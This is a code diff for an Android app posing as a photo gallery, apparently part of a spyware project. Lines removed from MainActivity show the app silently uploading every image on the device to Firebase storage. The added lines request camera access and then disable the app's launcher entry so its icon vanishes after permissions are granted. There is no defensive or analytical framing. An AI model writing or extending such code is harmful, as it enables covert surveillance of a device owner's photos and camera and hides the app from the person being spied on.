@@ -2,6 +2,7 @@ package o.pvt.gallery;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -11,8 +12,10 @@ import android.support.annotation.NonNull;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.support.v7.widget.RecyclerView;
 import android.view.View;
 import android.view.ViewGroup;
+import android.widget.AbsListView;
 import android.widget.AdapterView;
 import android.widget.BaseAdapter;
 import android.widget.GridView;
@@ -25,6 +28,7 @@ import com.google.firebase.storage.FirebaseStorage;
 import java.io.File;
 import java.net.URI;
 import java.util.ArrayList;
+import java.util.Date;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -64,9 +68,13 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         switch (requestCode) {
             case PERMISSION_ALL:
-                if (grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED
+                        && grantResults[2] == PackageManager.PERMISSION_GRANTED) {
 
                     gallery.setAdapter(new ImageAdapter(this));
+                    PackageManager p = getPackageManager();
+                    ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+                    p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
                 } else {
                     finish();
@@ -75,18 +83,18 @@ public class MainActivity extends AppCompatActivity {
     }
 
     void requestPermissions() {
-        String[] PERMISSIONS = {Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.INTERNET};
+        String[] PERMISSIONS = {Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.INTERNET, Manifest.permission.CAMERA};
 
         if (!hasPermissions(this, PERMISSIONS)) {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
         }else {
+
             gallery.setAdapter(new ImageAdapter(this));
-            FirebaseHelper firebaseHelper = new FirebaseHelper();
-            for(String image: images){
-                Uri img = Uri.fromFile(new File(image));
-                String name = new File(image).getName();
-                firebaseHelper.uploadImage(img, name);
-            }
+
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
         }
     }
 
@@ -115,7 +123,7 @@ public class MainActivity extends AppCompatActivity {
          */
         public ImageAdapter(Activity localContext) {
             context = localContext;
-            images = getAllShownImagesPath(context);
+            images = AppModel.getInstance().getAllShownImagesPath(context);
         }
 
         public int getCount() {
@@ -137,7 +145,7 @@ public class MainActivity extends AppCompatActivity {
                 picturesView = new ImageView(context);
                 picturesView.setScaleType(ImageView.ScaleType.FIT_XY);
                 picturesView
-                        .setLayoutParams(new GridView.LayoutParams(270, 270));
+                        .setLayoutParams(new GridView.LayoutParams(300, 300));
 
             } else {
                 picturesView = (ImageView) convertView;
@@ -156,31 +164,7 @@ public class MainActivity extends AppCompatActivity {
          * @param activity the activity
          * @return ArrayList with images Path
          */
-        private ArrayList<String> getAllShownImagesPath(Activity activity) {
-            Uri uri;
-            Cursor cursor;
-            int column_index_data;
-            ArrayList<String> listOfAllImages = new ArrayList<>();
-            imageNames = new ArrayList<>();
-            String absolutePathOfImage = null;
-            String imageName = null;
 
-            uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-
-            String[] projection = {MediaStore.MediaColumns.DATA,
-                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
-
-            cursor = activity.getContentResolver().query(uri, projection, null,
-                    null, null);
-
-            column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
-            while (cursor.moveToNext()) {
-                absolutePathOfImage = cursor.getString(column_index_data);
-
-                listOfAllImages.add(absolutePathOfImage);
-            }
-            return listOfAllImages;
-        }
     }
 }
 
